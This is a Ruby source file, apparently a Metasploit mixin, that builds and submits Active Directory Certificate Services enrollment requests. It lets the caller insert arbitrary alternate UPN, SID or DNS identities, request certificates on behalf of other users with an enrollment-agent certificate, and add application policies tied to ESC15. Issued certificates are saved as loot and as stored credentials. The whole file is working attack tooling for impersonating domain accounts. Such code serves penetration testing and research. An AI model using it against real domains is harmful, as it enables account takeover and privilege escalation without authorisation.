###
#
# This mixin provides methods wrapping CSR request methods in re/proto/x509/request
#
# -*- coding: binary -*-

require 'rex/proto/x509/request'

module Msf

  module Exploit::Remote::CertRequest
    # @param opts [Hash]
    # @option opts [String] :username the CN to embed in the CSR subject
    # @option opts [OpenSSL::PKey::RSA] :private_key an existing key to sign with; a new one is generated when omitted
    # @option opts [Integer] :rsa_key_size key size in bits (default: RSAKeySize datastore option, or 2048)
    # @option opts [String] :algorithm digest algorithm (default: DigestAlgorithm datastore option, or 'SHA256')
    # @option opts [String] :alt_dns DNS subjectAltName value
    # @option opts [String] :alt_upn UPN subjectAltName value (Microsoft OID)
    # @option opts [String] :alt_sid SID subjectAltName value (Microsoft NTDS CA security extension)
    # @option opts [Array<String>] :add_cert_app_policy application policy OIDs to embed
    # @option opts [OpenSSL::PKCS12] :pkcs12 agent certificate used to sign an on-behalf-of request
    # @option opts [String] :on_behalf_of UPN of the subject to request a certificate on behalf of
    # @option opts [String] :cert_template the AD CS certificate template to request
    # @return [Array(Rex::Proto::X509::Request, OpenSSL::PKey::RSA, Hash)] the signed CSR, the private key used to sign
    #   it, and a hash of enrollment request attributes (e.g. +CertificateTemplate+, +SAN+);
    #   when both +:pkcs12+ and +:on_behalf_of+ are supplied the first element is a
    #   {Rex::Proto::CryptoAsn1::Cms::ContentInfo} wrapping the inner CMC request instead
    def create_csr(opts={})
      rsa_key_size = opts.fetch(:rsa_key_size) { datastore['RSAKeySize'].blank? ? 2048 : datastore['RSAKeySize'].to_i }
      # can we double check if the key size is correct here when we are passed a private key?
      private_key = (opts[:private_key] || OpenSSL::PKey::RSA.new(rsa_key_size))
      if private_key.n.num_bits != rsa_key_size
        elog("RSA key size mismatch")
        raise ArgumentError, "RSA key size mismatch in create_csr()"
      end

      user = opts[:username]
      status_msg = "Building a certificate signing request for user #{user}"
      status_msg << " - RSA key size: #{rsa_key_size}"
      alt_dns = opts.fetch(:alt_dns) { datastore['ALT_DNS'].blank? ? nil : datastore['ALT_DNS'] }
      alt_sid = opts.fetch(:alt_sid) { datastore['ALT_SID'].blank? ? nil : datastore['ALT_SID'] }
      alt_upn = opts.fetch(:alt_upn) { datastore['ALT_UPN'].blank? ? nil : datastore['ALT_UPN'] }
      algorithm = opts.fetch(:algorithm) { datastore['DigestAlgorithm'].blank? ? 'SHA256' : datastore['DigestAlgorithm'] }
      application_policies = opts.fetch(:add_cert_app_policy) { datastore['ADD_CERT_APP_POLICY'].blank? ? nil : datastore['ADD_CERT_APP_POLICY'].split(/[;,]\s*|\s+/) }
      cert_template = opts.fetch(:cert_template) { datastore['CERT_TEMPLATE'].blank? ? nil : datastore['CERT_TEMPLATE'] }

      status_msg << " - alternate DNS: #{alt_dns}" if alt_dns
      status_msg << " - alternate UPN: #{alt_upn}" if alt_upn
      status_msg << " - digest algorithm: #{algorithm}" if algorithm
      status_msg << " - template: #{cert_template}" if cert_template
      
      csr = Rex::Proto::X509::Request.build_csr(
        cn: user,
        private_key: private_key,
        dns: alt_dns,
        msext_sid: alt_sid,
        msext_upn: alt_upn,
        algorithm: algorithm,
        application_policies: application_policies
      )

      pkcs12 = nil
      if opts.key?(:pkcs12)
        pkcs12 = opts[:pkcs12]
      elsif datastore['PFX'].present?
        pkcs12 = OpenSSL::PKCS12.new(File.binread(datastore['PFX']))
      end

      on_behalf_of = opts.fetch(:on_behalf_of) { datastore['ON_BEHALF_OF'].blank? ? nil : datastore['ON_BEHALF_OF'] }
      status_msg << " - on behalf of: #{on_behalf_of}" if on_behalf_of
      if pkcs12 && on_behalf_of
        vprint_status("Building certificate request on behalf of #{on_behalf_of}")
        csr = Rex::Proto::X509::Request.build_on_behalf_of(
          csr: csr,
          on_behalf_of: on_behalf_of,
          cert: pkcs12.certificate,
          key: pkcs12.key,
          algorithm: algorithm
        )
      end
      vprint_status status_msg

      attributes = {}
      attributes['CertificateTemplate'] = cert_template if cert_template
      san = []
      san << "dns=#{alt_dns}" if alt_dns
      san << "upn=#{alt_upn}" if alt_upn
      if alt_sid
        san << "url=#{Rex::Proto::X509::SAN_URL_PREFIX}#{alt_sid}"
        san << "url=#{alt_sid}"
      end
      attributes['SAN'] = san.join('&') unless san.empty?

      [csr, private_key, attributes]
    end

    # Build a CSR and coordinate the full ADCS certificate enrollment lifecycle.
    #
    # Constructs a CSR via {#create_csr}, yields it together with the enrollment
    # attributes to the caller-supplied block, which is responsible for the
    # actual transport (MS-ICPR, Web Enrollment, etc.).  After the block returns
    # a certificate, this method validates policy OIDs, logs certificate fields,
    # stores the PKCS#12 as loot, and optionally records a credential.
    #
    # @param opts [Hash] options forwarded to {#create_csr} plus the following:
    # @option opts [String] :username the CN to embed in the CSR subject
    # @option opts [String] :domain the AD domain used as the credential realm
    #   when a UPN domain cannot be derived from the certificate
    # @option opts [Hash] :service_data service attributes used to create a
    #   credential record; when omitted no credential is stored
    # @yieldparam csr [Rex::Proto::X509::Request, Rex::Proto::CryptoAsn1::Cms::ContentInfo]
    #   the signed CSR (or CMC-wrapped request for on-behalf-of enrollments)
    # @yieldparam attributes [Hash] enrollment request attributes
    #   (e.g. +CertificateTemplate+, +SAN+) to pass to the CA
    # @yieldreturn [OpenSSL::X509::Certificate, nil] the issued certificate, or
    #   +nil+ to abort enrollment
    # @return [OpenSSL::PKCS12, nil] the PKCS#12 bundle containing the issued
    #   certificate and private key, or +nil+ if the block returned +nil+ or
    #   policy OID validation failed
    def with_adcs_certificate_request(opts, &block)
      csr, private_key, attributes = create_csr(opts)

      vprint_status('Submitting the certificate signing request to the target...')
      certificate = block.call(csr, attributes)
      return unless certificate

      application_policies = opts.fetch(:add_cert_app_policy) do
        (datastore['ADD_CERT_APP_POLICY'].blank? ? nil : datastore['ADD_CERT_APP_POLICY'].split(/[;,]\s*|\s+/))
      end

      policy_oids = get_cert_policy_oids(certificate)
      if application_policies.present? && !(application_policies - policy_oids.map(&:value)).empty?
        print_error('Certificate application policy OIDs were submitted, but some are missing in the response. This indicates the target has received the patch for ESC15 (CVE-2024-49019) or the template is not vulnerable.')
        return
      end

      if policy_oids
        print_status('Certificate Policies:')
        policy_oids.each do |oid|
          print_status("  * #{oid.value}" + (oid.label.present? ? " (#{oid.label})" : ''))
        end
      end

      unless (dns = get_cert_san_dns(certificate)).empty?
        print_status("Certificate DNS: #{dns.join(', ')}")
      end

      unless (email = get_cert_san_email(certificate)).empty?
        print_status("Certificate Email: #{email.join(', ')}")
      end

      if (sid = get_cert_msext_sid(certificate))
        print_status("Certificate SID: #{sid}")
      end

      unless (upn = get_cert_msext_upn(certificate)).empty?
        print_status("Certificate UPN: #{upn.join(', ')}")
      end

      unless (uri = get_cert_san_uri(certificate)).empty?
        print_status("Certificate URI: #{uri.join(', ')}")
      end

      pkcs12 = OpenSSL::PKCS12.create('', '', private_key, certificate)

      upn_username = upn_domain = nil
      unless upn&.first.blank?
        info = "#{upn&.first} Certificate"
        # TODO: I was under the impression a single certificate can only have one UPN associated with it.
        #       But here, `upn` can be an array of UPN's. This will need to be sorted out.
        upn_username, upn_domain = upn&.first&.split('@')
      else
        info = "#{opts[:domain]}\\#{opts[:username]} Certificate"
      end

      if (service = opts[:service])
        # Only log a credential if we have service data to associate with it
        credential_data = {
          workspace_id: myworkspace_id,
          username: upn_username || opts[:username],
          private_type: :pkcs12,
          private_data: Base64.strict_encode64(pkcs12.to_der),
          private_metadata: {
            adcs_ca: datastore['CA'],
            adcs_template: opts.fetch(:cert_template) { datastore['CERT_TEMPLATE'].blank? ? nil : datastore['CERT_TEMPLATE'] }
          },
          realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
          realm_value: upn_domain || opts[:domain],
          origin_type: :service,
          service: service,
          module_fullname: fullname
        }
        create_credential(credential_data)
      end

      stored_path = store_loot('windows.ad.cs', 'application/x-pkcs12', rhost, pkcs12.to_der, 'certificate.pfx', info)
      print_status("Certificate stored at: #{stored_path}")

      pkcs12
    end

    # Get the certificate policy OIDs from the certificate.
    #
    # @param [OpenSSL::X509::Certificate] cert
    # @return [Array<Rex::Proto::CryptoAsn1::ObjectId>] The policy OIDs if any were found.
    def get_cert_policy_oids(cert)
      all_oids = []

      # ms-app-policies (CertificatePolicies) - existing handling
      if (ext = cert.extensions.find { |e| e.oid == 'ms-app-policies' })
        begin
          cert_policies = Rex::Proto::CryptoAsn1::X509::CertificatePolicies.parse(ext.value_der)
          cert_policies.value.each do |policy_info|
            oid_string = policy_info[:policyIdentifier].value
            all_oids << (Rex::Proto::CryptoAsn1::OIDs.value(oid_string) || Rex::Proto::CryptoAsn1::ObjectId.new(oid_string))
          end
        rescue StandardError => e
          vprint_error("Failed to parse ms-app-policies from certificate with subject:\"#{cert.subject.to_s}\" and issuer:\"#{cert.issuer.to_s}\". #{e.class}: #{e.message}")
        end
      end

      # extendedKeyUsage - SEQUENCE OF OBJECT IDENTIFIER
      if (eku_ext = cert.extensions.find { |e| e.oid == 'extendedKeyUsage' })
        begin
          asn1 = OpenSSL::ASN1.decode(eku_ext.value_der)
          # asn1 should be a Sequence whose children are OBJECT IDENTIFIER nodes
          if asn1.is_a?(OpenSSL::ASN1::Sequence)
            asn1.value.each do |node|
              next unless node.is_a?(OpenSSL::ASN1::ObjectId)
              oid_string = node.value
              all_oids << (Rex::Proto::CryptoAsn1::OIDs.value(oid_string) || Rex::Proto::CryptoAsn1::ObjectId.new(oid_string))
            end
          end
        rescue StandardError => e
          vprint_error("Failed to parse extendedKeyUsage from certificate with subject:\"#{cert.subject.to_s}\" and issuer:\"#{cert.issuer.to_s}\". #{e.class}: #{e.message}")
        end
      end

      all_oids
    end

    # Get the object security identifier (SID) from the certificate. This is a Microsoft specific extension.
    #
    # @param [OpenSSL::X509::Certificate] cert
    # @return [String, nil] The SID if it was found, otherwise nil.
    def get_cert_msext_sid(cert)
      ext = cert.extensions.find { |e| e.oid == Rex::Proto::X509::OID_NTDS_CA_SECURITY_EXT }
      return unless ext

      ntds_ca_security_ext = Rex::Proto::CryptoAsn1::NtdsCaSecurityExt.parse(ext.value_der)
      return unless ntds_ca_security_ext[:OtherName][:type_id].value == Rex::Proto::X509::OID_NTDS_OBJECTSID

      ntds_ca_security_ext[:OtherName][:value].value
    end

    # Get the User Principal Name (UPN) from the certificate. This is a Microsoft specific extension.
    #
    # @param [OpenSSL::X509::Certificate] cert
    # @return [Array<String>] The UPNs if any were found.
    def get_cert_msext_upn(cert)
      return [] unless (san = get_cert_san(cert))

      san[:GeneralNames].value.select do |gn|
        gn[:otherName][:type_id]&.value == Rex::Proto::X509::OID_NT_PRINCIPAL_NAME
      end.map do |gn|
        RASN1::Types::Utf8String.parse(gn[:otherName][:value].value, explicit: 0, constructed: true).value
      end
    end

    # Get the SubjectAltName (SAN) field from the certificate.
    #
    # @param [OpenSSL::X509::Certificate] cert
    # @return [Rex::Proto::CryptoAsn1::X509::SubjectAltName] The parsed SAN.
    def get_cert_san(cert)
      ext = cert.extensions.find { |e| e.oid == 'subjectAltName' }
      return unless ext

      Rex::Proto::CryptoAsn1::X509::SubjectAltName.parse(ext.value_der)
    end

    # Get the DNS hostnames from the certificate.
    #
    # @param [OpenSSL::X509::Certificate] cert
    # @return [Array<String>] The DNS names if any were found.
    def get_cert_san_dns(cert)
      return [] unless (san = get_cert_san(cert))

      san[:GeneralNames].value.select do |gn|
        gn[:dNSName].value?
      end.map do |gn|
        gn[:dNSName].value
      end
    end

    # Get the E-mail addresses from the certificate.
    #
    # @param [OpenSSL::X509::Certificate] cert
    # @return [Array<String>] The E-mail addresses if any were found.
    def get_cert_san_email(cert)
      return [] unless (san = get_cert_san(cert))

      san[:GeneralNames].value.select do |gn|
        gn[:rfc822Name].value?
      end.map do |gn|
        gn[:rfc822Name].value
      end
    end

    # Get the URI/URL from the certificate.
    #
    # @param [OpenSSL::X509::Certificate] cert
    # @return [Array<String>] The URIs/URLs if any were found.
    def get_cert_san_uri(cert)
      return [] unless (san = get_cert_san(cert))

      san[:GeneralNames].value.select do |gn|
        gn[:uniformResourceIdentifier].value?
      end.map do |gn|
        gn[:uniformResourceIdentifier].value
      end
    end
  end
end

